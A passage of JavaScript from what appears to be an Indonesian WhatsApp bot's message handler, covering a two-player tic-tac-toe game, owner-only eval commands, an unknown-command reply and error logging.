                                          ttt.includes('6️⃣') && !ttt.includes('7️⃣') && !ttt.includes('8️⃣') && !ttt.includes('9️⃣')) {
                                          ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Seri ??👌_*`
                                          ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
                                          reply(ucapan1)
                                          naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
                                          return ky_ttt = naa
                                   }
                                   ucapan = `*🎳 Game Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❎

Giliran = @${tty.player2.split('@')[0]}

${ttt}`
                                   dha.sendMessage(from, ucapan, text, {
                                          quoted: troli,
                                          contextInfo: {
                                                 mentionedJid: [tty.player1, tty.player2]
                                          }
                                   })
                            }
                            if (isTTT && isPlayer2) {
                                   nuber = parseInt(budy)
                                   if (isNaN(nuber)) return
                                   if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
                                   main = ky_ttt.filter(hjh => hjh.id.includes(from))
                                   if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
                                   if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
                                   s = '⭕'
                                   main[0].angka[nuber] = s
                                   main[0].gilir = main[0].player2
                                   naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
                                   ky_ttt = naa
                                   pop = main[0]
                                   ky_ttt.push(pop)
                                   tto = ky_ttt.filter(hgh => hgh.id.includes(from))
                                   tty = tto[0]
                                   angka = tto[0].angka
                                   ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

                                   ucapmenang = () => {
                                          ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player2.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
                                          ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
                                          dha.sendMessage(from, ucapan1, text, {
                                                 quoted: troli,
                                                 contextInfo: {
                                                        mentionedJid: [tty.player2]
                                                 }
                                          })
                                          naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
                                          return ky_ttt = naa
                                   }

                                   if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
                                   if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
                                   if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
                                   if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
                                   if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
                                   if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
                                   if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
                                   if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
                                   if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && !ttt.includes('4️⃣') && !
                                          ttt.includes('5️⃣') && !
                                          ttt.includes('6️⃣') && !ttt.includes('7️⃣') && !ttt.includes('8️⃣') && !ttt.includes('9️⃣')) {
                                          ucapan1 = `*🎳Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
                                          ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
                                          reply(ucapan1)
                                          naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
                                          return ky_ttt = naa
                                   }
                                   ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❎
   
Giliran = @${tty.player1.split('@')[0]}

${ttt}`
                                   dha.sendMessage(from, ucapan, text, {
                                          quoted: troli,
                                          contextInfo: {
                                                 mentionedJid: [tty.player1, tty.player2]
                                          }
                                   })
                            } else {}
                            if (budy.startsWith('>')) {
                                   if (!mek.key.fromMe && !isOwner) return
                                   try {
                                          return dha.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, {
                                                 quoted: mek
                                          })
                                   } catch (err) {
                                          e = String(err)
                                          reply(e)
                                   }
                            }
                            if (!isOwner) return
                            if (budy.startsWith('+')) {
                                   try {
                                          console.log(color('[ EVAL ]', 'pink'), color(time), budy, color('dari', 'yellow'), pushname, color('di'), isGroup ? groupName : 'Private Chat')
                                          reply(require('util').format(eval(`;(async () => { ${budy.slice(2)} })()`)))
                                   } catch (e) {
                                          console.log(e)
                                          err = String(e)
                                          js = JSON.stringify(e, null, 2)
                                          if (js == '{}') js = {
                                                 err
                                          }
                                          js = JSON.stringify(js, null, 2)
                                          js = '```' + js + '```'
                                          reply('_' + err + '_\n\n' + js)
                                   }
                            }
                            if (!isGroup && isCmd && !mek.key.fromMe) {
                                   teks = `Maaf @${senderr.split('@')[0]}, command ${prefix + command} tidak ada dalam menu`
                                   dha.sendMessage(from, {
                                          text: teks,
                                          jpegThumbnail: fs.readFileSync('./media/diablo.png')
                                   }, 'extendedTextMessage', {
                                          sendEphemeral: true,
                                          quoted: mek,
                                          contextInfo: {
                                                 forwardingScore: 508,
                                                 isForwarded: true,
                                                 mentionedJid: [senderr]
                                          }
                                   })
                            }
              }
              if (isGroup && budy != undefined) {} else {
                     console.log('[', color('TEXT', 'teal'), ']', `Message : ${budy} From`, color(pushname))
              }
       } catch (e) {
              e = String(e)
              if (!e.includes("this.isZero")) {
                     console.log('Message : %s', color(e, 'green'))
              }
       }
}
